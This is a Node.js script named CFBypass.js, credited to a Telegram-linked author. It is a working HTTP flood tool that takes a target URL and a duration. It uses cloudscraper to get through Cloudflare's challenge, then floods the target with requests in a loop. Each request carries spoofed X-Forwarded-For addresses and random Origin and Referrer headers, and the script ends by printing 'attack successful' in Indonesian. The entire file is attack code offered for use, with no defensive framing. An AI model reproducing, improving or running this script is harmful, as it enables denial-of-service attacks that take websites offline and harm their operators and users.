/*

# Created By KyuuRzy
# Contact ? : t.me/KyuuDev

# Thanks For Devorsixcore
# Contact ? : t.me/imdevorsix
!- do not delete this credit
!- don't sell it, let alone distribute it

*/

var cloudscraper = require("cloudscraper");
var request = require("request");
var randomstring = require("randomstring");
var args = process.argv.slice(2);
randomByte = function () {
  return Math.round(Math.random() * 256);
};
if (process.argv.length <= 2) {
  console.log("Usage: node CFBypass.js <url> <time>");
  console.log("Usage: node CFBypass.js <http://example.com> <60>");
  process.exit(-1);
}
var targetUrl = process.argv[2];
var attackDuration = process.argv[3];
setInterval;
var intervalId = setInterval(() => {
  var cookieHeader = "ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890";
  var userAgentFile = "proxy.txt";
  cloudscraper.get(targetUrl, function (err, response, body) {
    if (err) {
      console.log("Error occurred");
    } else {
      var responseHeaders = JSON.parse(JSON.stringify(response));
      cookieHeader = responseHeaders.request.headers.cookie;
      userAgentFile = responseHeaders.request.headers["User-Agent"];
    }
    var randomString = randomstring.generate({
      length: 10,
      charset: "abcdefghijklmnopqstuvwxyz0123456789"
    });
    var spoofedIp = randomByte() + "." + randomByte() + "." + randomByte() + "." + randomByte();
    const requestOptions = {
      url: targetUrl,
      headers: {
        "User-Agent": userAgentFile,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "2000",
        cookie: cookieHeader,
        Origin: "http://" + randomString + ".com",
        Referrer: "http://google.com/" + randomString,
        "X-Forwarded-For": spoofedIp
      }
    };
    function callback(err, res, body) {}
    request(requestOptions);
  });
});
setTimeout(() => clearInterval(intervalId), attackDuration * 100000);
process.on("uncaughtException", function (err) {});
process.on("unhandledRejection", function (reason) {});
console.log("Serangan sukses");
